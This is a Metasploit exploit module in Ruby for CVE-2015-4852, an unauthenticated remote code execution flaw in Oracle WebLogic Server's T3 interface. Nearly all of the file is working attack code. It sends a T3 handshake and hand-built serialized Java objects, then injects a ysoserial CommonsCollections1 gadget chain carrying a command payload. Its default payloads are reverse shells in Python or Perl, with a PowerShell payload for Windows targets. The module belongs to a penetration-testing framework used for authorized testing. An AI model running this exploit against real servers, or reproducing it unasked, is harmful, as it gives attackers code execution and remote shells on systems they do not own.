# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/powershell&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  #include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039; => &#039;Oracle Weblogic Server Deserialization RCE - Raw Object&#039;,
      &#039;Description&#039; => %q{
        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
        interface can send a serialized object (weblogic.jms.common.StreamMessageImpl)
        to the interface to execute code on vulnerable hosts.
      },
      &#039;Author&#039; =>
        [
        &#039;Andres Rodriguez&#039;,  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)
        &#039;Stephen Breen&#039;,     # Vulnerability Discovery
        &#039;Aaron Soto&#039;         # Reverse Engineering JSO and ysoserial blobs
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2015-4852&#039;]
        ],
      &#039;Privileged&#039; => false,
      &#039;Platform&#039; => %w{ unix win solaris },
      &#039;Targets&#039; =>
        [
          [ &#039;Unix&#039;,
            &#039;Platform&#039; => &#039;unix&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_python&#039;},
            &#039;Payload&#039; => {
              &#039;Encoder&#039; => &#039;cmd/ifs&#039;,
              &#039;BadChars&#039; => &#039; &#039;,
              &#039;Compat&#039; => {&#039;PayloadType&#039; => &#039;cmd&#039;, &#039;RequiredCmd&#039; => &#039;python&#039;}
            }
          ],
          [ &#039;Windows&#039;,
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Payload&#039; => {},
          ],
          [ &#039;Solaris&#039;,
            &#039;Platform&#039; => &#039;solaris&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_perl&#039;},
            &#039;Payload&#039; => {
              &#039;Space&#039;       => 2048,
              &#039;DisableNops&#039; => true,
              &#039;Compat&#039;      =>
                {
                  &#039;PayloadType&#039; => &#039;cmd&#039;,
                  &#039;RequiredCmd&#039; => &#039;generic perl telnet&#039;,
                }
            }
          ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 28 2015&#039;))

    register_options([Opt::RPORT(7001)])
  end

=begin   This check is currently incompatible with the Tcp mixin.  :-(
  def check
    resp = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/console/login/LoginForm.jsp&#039;
    )

    return CheckCode::Unknown unless resp && resp.code == 200

    unless resp.body.include?(&#039;Oracle WebLogic Server Administration Console&#039;)
      vprint_warning("Oracle WebLogic Server banner cannot be found")
      return CheckCode::Unknown
    end

    /WebLogic Server Version: (?<version>\d+\.\d+\.\d+\.\d*)/ =~ resp.body
    unless version
      vprint_warning("Oracle WebLogic Server version cannot be found")
      return CheckCode::Unknown
    end

    version = Gem::Version.new(version)
    vprint_good("Detected Oracle WebLogic Server Version: #{version}")
    case
    when version.to_s.start_with?(&#039;10.3&#039;)
      return CheckCode::Appears unless version > Gem::Version.new(&#039;10.3.6.0&#039;)
    when version.to_s.start_with?(&#039;12.1.2&#039;)
      return CheckCode::Appears unless version > Gem::Version.new(&#039;12.1.2.0&#039;)
    when version.to_s.start_with?(&#039;12.1.3&#039;)
      return CheckCode::Appears unless version > Gem::Version.new(&#039;12.1.3.0&#039;)
    when version.to_s.start_with?(&#039;12.2&#039;)
      return CheckCode::Appears unless version > Gem::Version.new(&#039;12.2.1.0&#039;)
    end

    return CheckCode::Safe
  end
=end

  def t3_handshake
    # retrieved from network traffic
    shake = "t3 12.2.1\n"
    shake << "AS:255\n"
    shake << "HL:19\n"
    shake << "MS:10000000\n\n"

    sock.put(shake)
    sleep(1)
    sock.get_once
  end

  def build_t3_request_object
    # T3 request serialized data
    # retrieved by watching network traffic
    # This is a proprietary, undocumented protocol

    # TODO: Cite a source for the dissection of in the following 14 lines:
    data =  &#039;000005c3&#039;                                     # lenght of the packet
    data << &#039;01&#039;                                           # CMD_IDENTIFY_REQUEST
    data << &#039;65&#039;                                           # QOS
    data << &#039;01&#039;                                           # Flags:
                                                           #   CONTEXT_JVMID_FLAG = 1 (has JVMIDs)
                                                           #   CONTEXT_TX_FLAG = 2
                                                           #   CONTEXT_TRACE_FLAG = 4
                                                           #   CONTEXT_EXTENDED_FLAG = 8
                                                           #   CONTEXT_EXTENDED_USER_FLAG = 16
    data << &#039;ffffffff&#039;                                     # response id
    data << &#039;ffffffff&#039;                                     # invocable id
    data << &#039;0000006a&#039;                                     # abbrev offset
    data << &#039;0000ea60&#039;                                     # reconnect timeout ??

    data << &#039;0000001900937b484a&#039;
    data << &#039;56fa4a777666f581daa4f5b90e2aebfc607499&#039;
    data << &#039;b4027973720078720178720278700000000a00&#039;
    data << &#039;00000300000000000000060070707070707000&#039;
    data << &#039;00000a000000030000000000000006007006&#039;

    data << &#039;fe010000&#039;                                     # ----- separator -----

    data << &#039;aced0005&#039;                                     # JSO v5 header
    data << &#039;73&#039;                                           # object header
    data << &#039;72001d&#039;                                       # className (29 bytes):
    data << &#039;7765626c6f6769632e726a766d2e436c617373&#039;       #   weblogic.rjvm.ClassTableEntry
    data << &#039;5461626c65456e747279&#039;                         #     (continued)
    data << &#039;2f52658157f4f9ed&#039;                             #   serialVersionUID
    data << &#039;0c00007870&#039;                                   #   remainder of object header
    data << &#039;72&#039;                                           # object header
    data << &#039;00247765626c6f6769632e636f6d6d6f6e2e696e74&#039;   #   className (36 bytes): weblogic.common.internal.PackageInfo
    data << &#039;65726e616c2e5061636b616765496e666f&#039;           #     (continued)
    data << &#039;e6f723e7b8ae1ec9&#039;                             #   serialVersionUID
    data << &#039;02&#039;                                           #   SC_SERIALIZABLE
    data << &#039;0008&#039;                                         #   fieldCount = 8
    data << &#039;4900056d616a6f72&#039;                             #     0: Int: major
    data << &#039;4900056d696e6f72&#039;                             #     1: Int: minor
    data << &#039;49000c726f6c6c696e675061746368&#039;               #     2: Int rollingPatch
    data << &#039;49000b736572766963655061636b&#039;                 #     3: Int: servicePack
    data << &#039;5a000e74656d706f726172795061746368&#039;           #     4: Bool: temporaryPatch
    data << &#039;4c0009696d706c5469746c65&#039;                     #     5: Obj: implTitle
    data << &#039;7400124c6a6176612f6c616e672f537472696e673b&#039;   #        java/lang/String
    data << &#039;4c000a696d706c56656e646f72&#039;                   #     6: Obj: implVendor
    data << &#039;71007e0003&#039;                                   #        (Handle) 0x007e0003
    data << &#039;4c000b696d706c56657273696f6e&#039;                 #     7: Obj: implVersion
    data << &#039;71007e0003&#039;                                   #        (Handle) 0x007e0003
    data << &#039;78707702000078&#039;                               #   block footers

    data << &#039;fe010000&#039;                                     # ----- separator -----

    data << &#039;aced0005&#039;                                     # JSO v5 header
    data << &#039;7372&#039;                                         #   object header
    data << &#039;001d7765626c6f6769632e726a766d2e436c6173&#039;     #   className (29 bytes): weblogic.rjvm.ClassTableEntry
    data << &#039;735461626c65456e747279&#039;                       #     (continued)
    data << &#039;2f52658157f4f9ed&#039;                             #   serialVersionUID
    data << &#039;0c&#039;                                           #   EXTERNALIZABLE | BLOCKDATA
    data << &#039;00007870&#039;                                     #   remainder of object header
    data << &#039;72&#039;                                           # object header
    data << &#039;00247765626c6f6769632e636f6d6d6f6e2e696&#039;      #   className (36 bytes): weblogic.common.internal.VersionInfo
    data << &#039;e7465726e616c2e56657273696f6e496e666f&#039;        #     (continued)
    data << &#039;972245516452463e&#039;                             #   serialVersionUID
    data << &#039;02&#039;                                           #   SC_SERIALIZABLE
    data << &#039;0003&#039;                                         #   fieldCount = 3
    data << &#039;5b0008&#039;                                       #   array header (8 bytes)
    data << &#039;7061636b61676573&#039;                             #     ARRAY NAME = &#039;packages&#039;
    data << &#039;740027&#039;                                       #     TC_STRING className1 (39 bytes)
    data << &#039;5b4c7765626c6f6769632f636f6d6d6f6e2f69&#039;       #       weblogic/common/internal/PackageInfo
    data << &#039;6e7465726e616c2f5061636b616765496e666f&#039;       #       (continued)
    data << &#039;3b&#039;                                           #       (continued)
    data << &#039;4c000e&#039;                                       #   object header (14 bytes)
    data << &#039;72656c6561736556657273696f6e&#039;                 #     releaseVersion
    data << &#039;740012&#039;                                       #     TC_STRING (18 bytes)
    data << &#039;4c6a6176612f6c616e672f537472696e673b&#039;         #       versionInfoAsBytes
    data << &#039;5b0012&#039;                                       #   array header (18 bytes)
    data << &#039;76657273696f6e496e666f41734279746573&#039;         #     ARRAY NAME = java/lang/String;
    data << &#039;740002&#039;                                       #     TC_STRING (2 bytes)
    data << &#039;5b42&#039;                                         #       0x5b42 = [B
    data << &#039;78&#039;                                           # block footer

    data << &#039;720024&#039;                                       # class (36 bytes)
    data << &#039;7765626c6f6769632e636f6d6d6f6e2e696e&#039;         #   weblogic.common.internal.PackageInfo
    data << &#039;7465726e616c2e5061636b616765496e666f&#039;         #     (continued)
    data << &#039;e6f723e7b8ae1ec9&#039;                             #   serialVersionUID

    data << &#039;02&#039;                                           #   SC_SERIALIZABLE
    data << &#039;0008&#039;                                         #   fieldCount = 8
    data << &#039;4900056d616a6f72&#039;                             #   0: Int: major
    data << &#039;4900056d696e6f72&#039;                             #   1: Int: minor
    data << &#039;49000c726f6c6c696e675061746368&#039;               #   2: Int rollingPatch
    data << &#039;49000b736572766963655061636b&#039;                 #   3: Int: servicePack
    data << &#039;5a000e74656d706f726172795061746368&#039;           #   4: Bool: temporaryPatch
    data << &#039;4c0009696d706c5469746c65&#039;                     #   5: Obj: implTitle
    data << &#039;71&#039;                                           #      TC_REFERENCE
    data << &#039;007e0004&#039;                                     #      Handle = 0x007e0004
    data << &#039;4c000a696d706c56656e646f72&#039;                   #   6: Obj: implVendor
    data << &#039;71&#039;                                           #      TC_REFERENCE
    data << &#039;007e0004&#039;                                     #      Handle = 0x007e0004
    data << &#039;4c000b696d706c56657273696f6e&#039;                 #   7: Obj: implVersion
    data << &#039;71&#039;                                           #      TC_REFERENCE
    data << &#039;007e0004&#039;                                     #      Handle = 0x007e0004
    data << &#039;78&#039;                                           # class footer
    data << &#039;70&#039;                                           # TC_NULL
    data << &#039;77020000&#039;                                     # BLOCKDATA (2 bytes): 0x0000
    data << &#039;78&#039;                                           # block footer

    data << &#039;fe010000&#039;                                     # ----- separator -----

    data << &#039;aced0005&#039;                                     # JSO v5 header
    data << &#039;73&#039;                                           # object header
    data << &#039;72001d&#039;                                       # className (29 bytes):
    data << &#039;7765626c6f6769632e726a766d2e436c617373&#039;       #   weblogic.rjvm.ClassTableEntry
    data << &#039;5461626c65456e747279&#039;                         #     (continued)
    data << &#039;2f52658157f4f9ed&#039;                             #   serialVersionUID
    data << &#039;0c00007870&#039;                                   #   remainder of object header
    data << &#039;720021&#039;                                       # className (33 bytes)
    data << &#039;7765626c6f6769632e636f6d6d6f6e2e696e74&#039;       #   weblogic.common.internal.PeerInfo
    data << &#039;65726e616c2e50656572496e666f&#039;                 #     (continued)
    data << &#039;585474f39bc908f1&#039;                             #   serialVersionUID
    data << &#039;02&#039;                                           #   SC_SERIALIZABLE
    data << &#039;0006&#039;                                         #   fieldCount = 6
    data << &#039;4900056d616a6f72&#039;                             #     0: Int: major
    data << &#039;4900056d696e6f72&#039;                             #     1: Int: minor
    data << &#039;49000c726f6c6c696e675061746368&#039;               #     2: Int rollingPatch
    data << &#039;49000b736572766963655061636b&#039;                 #     3: Int: servicePack
    data << &#039;5a000e74656d706f726172795061746368&#039;           #     4: Bool: temporaryPatch
    data << &#039;5b00087061636b61676573&#039;                       #     5: Array: packages
    data << &#039;740027&#039;                                       #        TC_STRING (39 bytes)
    data << &#039;5b4c7765626c6f6769632f636f6d6d6f6e2f69&#039;       #        Lweblogic/common/internal/PackageInfo;
    data << &#039;6e7465726e616c2f5061636b616765496e666f&#039;       #        (continued)
    data << &#039;3b&#039;                                           #        (continued)
    data << &#039;78&#039;                                           # block footer
    data << &#039;720024&#039;                                       # class header
    data << &#039;7765626c6f6769632e636f6d6d6f6e2e696e74&#039;       #   Name = Lweblogic/common/internal/PackageInfo;
    data << &#039;65726e616c2e56657273696f6e496e666f&#039;           #     (continued)
    data << &#039;972245516452463e&#039;                             #   serialVersionUID
    data << &#039;02&#039;                                           #   SC_SERIALIZABLE
    data << &#039;0003&#039;                                         #   fieldCount = 3
    data << &#039;5b0008&#039;                                       #   0: Array
    data << &#039;7061636b6167657371&#039;                           #      packages
    data << &#039;007e0003&#039;                                     #      Handle = 0x00730003
    data << &#039;4c000e72656c6561736556657273696f6e&#039;           #   1: Obj: releaseVersion
    data << &#039;7400124c6a6176612f6c616e672f537472696e673b&#039;   #      Ljava/lang/String;
    data << &#039;5b001276657273696f6e496e666f41734279746573&#039;   #   2: Array: versionInfoAsBytes
    data << &#039;740002&#039;                                       #      TC_STRING (2 bytes)
    data << &#039;5b42&#039;                                         #      VALUE = 0x5b42 = [B
    data << &#039;78&#039;                                           # block footer
    data << &#039;720024&#039;                                       # class header
    data << &#039;7765626c6f6769632e636f6d6d6f6e2e696e746572&#039;   #   Name = weblogic.common.internal.PackageInfo
    data << &#039;6e616c2e5061636b616765496e666f&#039;               #     (continued)
    data << &#039;e6f723e7b8ae1ec9&#039;                             #   serialVersionUID
    data << &#039;02&#039;                                           #   SC_SERIALIZABLE
    data << &#039;0008&#039;                                         #   fieldCount = 8
    data << &#039;4900056d616a6f72&#039;                             #   0: Int: major
    data << &#039;4900056d696e6f72&#039;                             #   1: Int: minor
    data << &#039;49000c726f6c6c696e675061746368&#039;               #   2: Int rollingPatch
    data << &#039;49000b736572766963655061636b&#039;                 #   3: Int: servicePack
    data << &#039;5a000e74656d706f726172795061746368&#039;           #   4: Bool: temporaryPatch
    data << &#039;4c0009696d706c5469746c65&#039;                     #   5: Obj: implTitle
    data << &#039;71&#039;                                           #      TC_REFERENCE
    data << &#039;007e0005&#039;                                     #      Handle = 0x007e0005
    data << &#039;4c000a696d706c56656e646f72&#039;                   #   6: Obj: implVendor
    data << &#039;71&#039;                                           #      TC_REFERENCE
    data << &#039;007e0005&#039;                                     #      Handle = 0x007e0005
    data << &#039;4c000b696d706c56657273696f6e&#039;                 #   7: Obj: implVersion
    data << &#039;71&#039;                                           #      TC_REFERENCE
    data << &#039;007e0005&#039;                                     #      Handle = 0x007e0005
    data << &#039;78&#039;                                           # class footer
    data << &#039;707702000078&#039;                                 # block footers

    data << &#039;fe00ff&#039;                                       # this cruft again.  some kind of footer

    data << &#039;fe010000&#039;                                     # ----- separator -----

    # weblogic.rjvm.JVMID object
    data << &#039;aced0005&#039;                                     # JSO v5 header
    data << &#039;73&#039;                                           # object header
    data << &#039;720013&#039;                                       #   class header
    data << &#039;7765626c6f6769632e726a766d2e4a564d4944&#039;       #     name = &#039;weblogic.rjvm.JVMID&#039;
    data << &#039;dc49c23ede121e2a&#039;                             #     serialVersionUID
    data << &#039;0c&#039;                                           #     EXTERNALIZABLE | BLOCKDATA
    data << &#039;0000&#039;                                         #     fieldCount = 0   (!!!)
    data << &#039;78&#039;                                           #   block footer
    data << &#039;70&#039;                                           # NULL
    data << &#039;7750&#039;                                         # block header (80 bytes)
    data << &#039;21&#039;                                           #   !
    data << &#039;000000000000000000&#039;                           #   9 NULL BYTES

    data << &#039;0d&#039;                                           #   strLength = 13 bytes
    #data << &#039;3139322e3136382e312e323237&#039;                  #   original PoC string = 192.168.1.227
    data << &#039;3030302e3030302e3030302e30&#039;                   #   new string = 000.000.000.0
                                                           #      (must be an IP, and length isn&#039;t trivially editable)
    data << &#039;00&#039;                                           #   \0

    data << &#039;12&#039;                                           #   strLength = 18 bytes
    #data << &#039;57494e2d4147444d565155423154362e6568&#039;        #   original str = WIN-AGDMVQUB1T6.eh
    data << rand_text_alphanumeric(18).unpack(&#039;H*&#039;)[0]

    data << &#039;83348cd6&#039;                                     #  original = ??? UNKNOWN ???  (Note: Cannot be randomized)

    data << &#039;000000070000&#039;                                 #   ??? UNKNOWN ???
    data << rport.to_s(16).rjust(4, &#039;0&#039;)                   #   callback port
    data << &#039;ffffffffffffffffffffffffffffffffffffff&#039;       #   ??? UNKNOWN ???
    data << &#039;ffffffffff&#039;                                   #   ??? UNKNOWN ???
    data << &#039;78&#039;                                           # block footer

    data << &#039;fe010000&#039;                                     # ----- separator -----

    # weblogic.rjvm.JVMID object
    data << &#039;aced0005&#039;                                     # JSO v5 header
    data << &#039;73&#039;                                           # object header
    data << &#039;72&#039;                                           #   class
    data << &#039;00137765626c6f6769632e726a766d2e4a564d4944&#039;   #   Name: weblogic.rjvm.JVMID
    data << &#039;dc49c23ede121e2a&#039;                             #   serialVersionUID
    data << &#039;0c&#039;                                           #   EXTERNALIZABLE | BLOCKDATA
    data << &#039;0000&#039;                                         #   fieldCount = 0
    data << &#039;78&#039;                                           # end block
    data << &#039;70&#039;                                           # TC_NULL
    data << &#039;77&#039;                                           # block header
    data << &#039;20&#039;                                           #   length = 32 bytes
    data << &#039;0114dc42bd071a772700&#039;                         #   old string = ??? UNKNOWN ???
    #data << rand_text_alphanumeric(10).unpack(&#039;H*&#039;)[0]    #     (NOTE: RANDOMIZAITON BREAKS THINGS)

    data << &#039;0d&#039;                                           #   string length = 13 bytes (NOTE: do not edit)
    #data << &#039;3234322e3231342e312e323534&#039;                  #   original string = 242.214.1.254
    data << &#039;3030302e3030302e3030302e30&#039;                   #   new string = 000.000.000.0
                                                           #      (must be an IP, and length isn&#039;t trivially editable)

    #data << &#039;61863d1d&#039;                                    #   original string = ??? UNKNOWN ???
    data << rand_text_alphanumeric(4).unpack(&#039;H*&#039;)[0]      #   new = randomized

    data << &#039;00000000&#039;                                     #   NULL BYTES
    data << &#039;78&#039;                                           # block footer

    sock.put([data].pack(&#039;H*&#039;))
    sleep(1)
    sock.get_once
  end

  def send_payload_objdata
    # payload creation
    if target.name == &#039;Windows&#039;
      mycmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true})
    elsif target.name == &#039;Unix&#039; || target.name == &#039;Solaris&#039;
      mycmd = payload.encoded
    end

    # basic weblogic ClassTableEntry object (serialized)
    # TODO: WHAT DOES THIS DO?  CAN WE RANDOMIZE ANY OF IT?
    payload = &#039;056508000000010000001b0000005d0101007372017870737202787000000000&#039;
    payload << &#039;00000000757203787000000000787400087765626c6f67696375720478700000&#039;
    payload << &#039;000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306&#039;

    payload << &#039;fe010000&#039;                                  # ----- separator -----

    payload << &#039;aced0005&#039;                                  # JSO v5 header
    payload << &#039;73&#039;                                        # object header
    payload << &#039;72&#039;                                        #   class
    payload << &#039;001d7765626c6f6769632e726a766d2e436c61&#039;    #   Name: weblogic.rjvm.ClassTableEntry
    payload << &#039;73735461626c65456e747279&#039;                  #     (cont)
    payload << &#039;2f52658157f4f9ed&#039;                          #   serialVersionUID
    payload << &#039;0c&#039;                                        #   EXTERNALIZABLE | BLOCKDATA
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;7870&#039;                                      #   remaining object header
    payload << &#039;72&#039;                                        # class header
    payload << &#039;00025b42&#039;                                  #   Name: 0x5b42
    payload << &#039;acf317f8060854e0&#039;                          #   serialVersionUID
    payload << &#039;02&#039;                                        #   SERIALIZABLE
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;7870&#039;                                      #   class footer
    payload << &#039;77&#039;                                        # block header
    payload << &#039;020000&#039;                                    #   contents = 0x0000
    payload << &#039;78&#039;                                        #   block footer

    payload << &#039;fe010000&#039;                                  # ----- separator -----

    payload << &#039;aced0005&#039;                                  # JSO v5 header
    payload << &#039;73&#039;                                        # object header
    payload << &#039;72&#039;                                        #   class
    payload << &#039;001d7765626c6f6769632e726a766d2e436c61&#039;    #   Name: weblogic.rjvm.ClassTableEntry
    payload << &#039;73735461626c65456e747279&#039;                  #     (cont)
    payload << &#039;2f52658157f4f9ed&#039;                          #   serialVersionUID
    payload << &#039;0c&#039;                                        #   EXTERNALIZABLE | BLOCKDATA
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;7870&#039;                                      #   remaining object header
    payload << &#039;72&#039;                                        # class header

    payload << &#039;00135b4c6a6176612e6c616e672e4f626a&#039;        #   Name: [Ljava.lang.Object;
    payload << &#039;6563743b&#039;                                  #     (cont)
    payload << &#039;90ce589f1073296c&#039;                          #   serialVersionUID
    payload << &#039;02&#039;                                        #   SERIALIZABLE
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;7870&#039;                                      #   remaining object header
    payload << &#039;77&#039;                                        # block header
    payload << &#039;020000&#039;                                    #   contents = 0x0000
    payload << &#039;78&#039;                                        #   block footer

    payload << &#039;fe010000&#039;                                  # ----- separator -----

    payload << &#039;aced0005&#039;                                  # JSO v5 header
    payload << &#039;73&#039;                                        # object header
    payload << &#039;72&#039;                                        #   class

    payload << &#039;001d7765626c6f6769632e726a766d2e436c61&#039;    #   Name: weblogic.rjvm.ClassTableEntry
    payload << &#039;73735461626c65456e747279&#039;                  #     (cont)
    payload << &#039;2f52658157f4f9ed&#039;                          #   serialVersionUID
    payload << &#039;0c&#039;                                        #   SERIALIZABLE | BLOCKDATA
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;7870&#039;                                      #   block footer
    payload << &#039;72&#039;                                        # class header
    payload << &#039;00106a6176612e7574696c2e566563746f72&#039;      #   Name: java.util.Vector
    payload << &#039;d9977d5b803baf01&#039;                          #   serialVersionUID
    payload << &#039;03&#039;                                        #   WRITE_METHOD | SERIALIZABLE
    payload << &#039;0003&#039;                                      #   fieldCount = 3
    payload << &#039;4900116361706163697479496e6372656d656e74&#039;  #   0: Int: capacityIncrement
    payload << &#039;49000c656c656d656e74436f756e74&#039;            #   1: Int: elementCount
    payload << &#039;5b000b656c656d656e7444617461&#039;              #   2: Array: elementData
    payload << &#039;7400135b4c6a6176612f6c616e672f4f626a6563&#039;  #   3: String: [Ljava/lang/Object;
    payload << &#039;743b&#039;                                      #      (cont)
    payload << &#039;7870&#039;                                      #   remaining object header
    payload << &#039;77&#039;                                        # block header
    payload << &#039;020000&#039;                                    #   contents = 0x0000
    payload << &#039;78&#039;                                        #   block footer

    payload << &#039;fe010000&#039;                                  # ----- separator -----

    ysoserial_payload = ::Msf::Util::JavaDeserialization.ysoserial_payload("CommonsCollections1",mycmd)
    payload << ysoserial_payload.each_byte.map { |b| b.to_s(16).rjust(2,&#039;0&#039;) }.join

    payload << &#039;fe010000&#039;                                  # ----- separator -----

    # basic weblogic ImmutableServiceContext object (serialized)
    payload << &#039;aced0005&#039;                                  # JSO v5 header
    payload << &#039;73&#039;                                        # object header
    payload << &#039;72&#039;                                        #   class
    payload << &#039;00257765626c6f6769632e726a766d2e496d6d75&#039;  #   Name: weblogic.rjvm.ImmutableServiceContext
    payload << &#039;7461626c6553657276696365436f6e74657874&#039;    #     (cont)
    payload << &#039;ddcba8706386f0ba&#039;                          #   serialVersionUID
    payload << &#039;0c&#039;                                        #   EXTERNALIZABLE | BLOCKDATA
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;78&#039;                                        #   object footer
    payload << &#039;72&#039;                                        # block header
    payload << &#039;00297765626c6f6769632e726d692e70726f76&#039;    #   Name: weblogic.rmi.provider.BasicServiceContext
    payload << &#039;696465722e426173696353657276696365436f&#039;    #     (cont)
    payload << &#039;6e74657874&#039;                                #     (cont)
    payload << &#039;e4632236c5d4a71e&#039;                          #   serialVersionUID
    payload << &#039;0c&#039;                                        #     EXTERNALIZABLE | BLOCKDATA
    payload << &#039;0000&#039;                                      #   fieldCount = 0
    payload << &#039;7870&#039;                                      #   block footer
    payload << &#039;77&#039;                                        # block header
    payload << &#039;020600&#039;                                    #   contents = 0x0600
    payload << &#039;7372&#039;                                      #   class descriptor
    payload << &#039;00267765626c6f6769632e726d692e696e7465&#039;    #     Name: weblogic.rmi.internal.MethodDescriptor
    payload << &#039;726e616c2e4d6574686f644465736372697074&#039;    #       (cont)
    payload << &#039;6f72&#039;                                      #       (cont)
    payload << &#039;12485a828af7f67b&#039;                          #     serialVersionUID
    payload << &#039;0c&#039;                                        #     EXTERNALIZABLE | BLOCKDATA
    payload << &#039;0000&#039;                                      #     fieldCount = 0
    payload << &#039;7870&#039;                                      #     class footer
    payload << &#039;77&#039;                                        #   class data

    #payload << &#039;34002e61757468656e746963617465284c7765&#039;    #     old contents = 0x002e61757468656e746963617465284c7765
    #payload << &#039;626c6f6769632e73656375726974792e61636c&#039;    #                    626c6f6769632e73656375726974792e61636c
    #payload << &#039;2e55736572496e666f3b290000001b&#039;            #                    2e55736572496e666f3b290000001b
    payload << rand_text_alphanumeric(52).unpack(&#039;H*&#039;)[0]  #   new = randomized
    payload << &#039;78&#039;                                        #     class footer
    payload << &#039;78&#039;                                        #   block footer
                                                           # MISSING OBJECT FOOTER (0x78)

    payload << &#039;fe00ff&#039;                                    # this cruft again.  some kind of footer

    # sets the length of the stream
    data = ((payload.length >> 1) + 4).to_s(16).rjust(8,&#039;0&#039;)
    data << payload

    sock.put([data].pack(&#039;H*&#039;))
    sleep(1)
    sock.get_once

  end

  def exploit
    connect

    print_status(&#039;Sending handshake...&#039;)
    t3_handshake

    print_status(&#039;Sending T3 request object...&#039;)
    build_t3_request_object

    print_status(&#039;Sending client object payload...&#039;)
    send_payload_objdata

    handler
    disconnect
  end
end

